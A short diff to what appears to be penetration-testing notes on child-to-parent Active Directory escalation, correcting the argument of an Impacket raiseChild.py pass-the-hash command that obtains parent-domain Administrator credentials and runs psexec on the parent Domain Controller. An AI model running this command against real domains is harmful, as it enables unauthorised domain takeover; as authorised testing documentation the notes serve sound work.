@@ -11,5 +11,5 @@ golden + extraSids
 - Retrieves credentials for the Administrator account in the parent domain
 - authenticates to the parent domain's Domain Controller via Psexec (-target-exec ip)
 ```
-raiseChild.py -debug -hashes :<nt_hash> <domain>/administrator
+raiseChild.py -debug -hashes :<nt_hash> <domain_fqdn>/administrator
 ```
